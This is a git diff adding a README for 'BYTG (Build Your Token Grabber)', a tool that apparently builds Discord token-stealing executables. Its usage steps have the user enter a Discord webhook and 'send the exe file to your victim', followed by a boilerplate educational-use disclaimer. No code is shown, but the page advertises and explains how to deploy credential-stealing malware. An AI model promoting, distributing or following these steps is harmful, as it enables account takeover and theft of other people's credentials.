@@ -1,2 +1,25 @@
+<div align="center">
+
 # BYTG
-Build Your Token Grabber
+
+</div>
+<div align="center">
+  Star ⭐ if you want more <br>
+  <a href="">Installation</a> | <a href="https://discord.gg/XnRjFmgPYz">Discord</a> | <a href="">Disclaimer</a>
+</div>
+
+## 📍 About
+BYTG (Build Your Token Grabber)
+![screen](https://user-images.githubusercontent.com/87500882/232589478-16f0263b-6e8b-4561-bcd0-caa65df1d954.png)
+
+## 💻 Usage
+* Download the exe verions from the last [realese]().
+* Execute it.
+* Input your discord webhook link.
+* Send the exe file to your victim.
+
+## :question: Support
+If you have any issues or need help contantact 2loop#6969, CaptainBeluga#5006 on discord or just join our [server](https://discord.gg/XnRjFmgPYz).
+
+## :warning: Disclaimer
+Please note that the infos and information contained in this program is for educational purposes only and should not be used to unauthorized / illegal activities. The developer and contributors are not responsible for any misuse of this software.
